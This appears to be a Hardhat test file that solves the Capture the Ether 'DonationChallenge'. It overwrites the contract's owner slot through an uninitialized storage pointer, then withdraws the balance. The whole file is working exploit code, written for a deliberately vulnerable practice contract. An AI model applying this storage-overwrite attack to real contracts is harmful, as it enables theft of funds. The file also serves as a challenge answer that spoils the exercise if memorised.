const { expect } = require("chai");
const { buildContract } = require("../utils");
const assert = require('node:assert').strict;

it("Solves DonationChallenge", async function () {
  const [, attacker] = await ethers.getSigners();
  const contract = await buildContract("DonationChallenge", ethers.parseEther("1.0"));

  const attackerAddress = await attacker.getAddress();
  // 2**160 ~ 10**48, which means sentValueInWei ~10**-6.
  const sentValueInWei = BigInt(attackerAddress) / (10n ** 36n);

  // Since the storage location of `Donation` is on state instead of memory, we can override the `owner` slot by providing `etherAmount`.
  // Latest solc would give a warning for unintialized storage pointer.
  const contractConnectedToAttacker = contract.connect(attacker);
  await contractConnectedToAttacker.donate(BigInt(attackerAddress), {value: BigInt(attackerAddress) / (10n ** 36n)});
  await contractConnectedToAttacker.withdraw();

  expect(await contract.isComplete()).to.equal(true);
});
